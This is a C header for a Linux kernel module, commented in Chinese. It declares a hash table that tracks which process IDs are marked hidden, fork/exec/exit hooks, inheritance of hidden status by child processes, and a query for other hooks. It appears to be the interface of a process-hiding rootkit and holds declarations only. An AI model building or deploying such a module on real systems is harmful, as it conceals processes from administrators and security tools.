#ifndef _PROC_STATE_H_
#define _PROC_STATE_H_

#include <linux/types.h>
#include <linux/hashtable.h>
#include <linux/spinlock.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/string.h>

/* ------------------------------------------------- */
/*                  隐藏标志位                      */
/* ------------------------------------------------- */
enum proc_flags {
    PROC_HIDDEN_SELF      = (1 << 0),  /* 进程自身被标记为隐藏 */
    PROC_HIDDEN_INHERITED = (1 << 1),  /* 继承父进程隐藏标志 */
};

/* ------------------------------------------------- */
/*                  进程状态结构体                  */
/* ------------------------------------------------- */
struct proc_state {
    pid_t pid;             /* PID */
    pid_t ppid;            /* 父进程 PID */
    u32   flags;           /* 隐藏标志 */
    struct hlist_node node; /* hash 链表节点 */
};

/* ------------------------------------------------- */
/*                  生命周期管理                     */
/* ------------------------------------------------- */
int  proc_state_init(void);       /* 初始化 proc_state 哈希表 */
void proc_state_cleanup(void);    /* 清理 proc_state 哈希表 */

int  lifecycle_init(void);        /* 注册 fork/exec/exit hook */
void lifecycle_cleanup(void);     /* 注销 hook */

/* ------------------------------------------------- */
/*                  状态操作                         */
/* ------------------------------------------------- */
void proc_state_set(pid_t pid, pid_t ppid, u32 flags); /* 设置 PID 隐藏状态 */
void proc_state_clear(pid_t pid);                       /* 清除 PID 隐藏状态 */

/* ------------------------------------------------- */
/*                  查询接口（给 hook 使用）         */
/* ------------------------------------------------- */
bool proc_is_hidden(pid_t pid);                        /* 判断 PID 是否被隐藏 */

/* ------------------------------------------------- */
/*                  继承逻辑                         */
/* ------------------------------------------------- */
void proc_state_inherit(pid_t parent, pid_t child);    /* 子进程继承父进程隐藏状态 */

#endif /* _PROC_STATE_H_ */
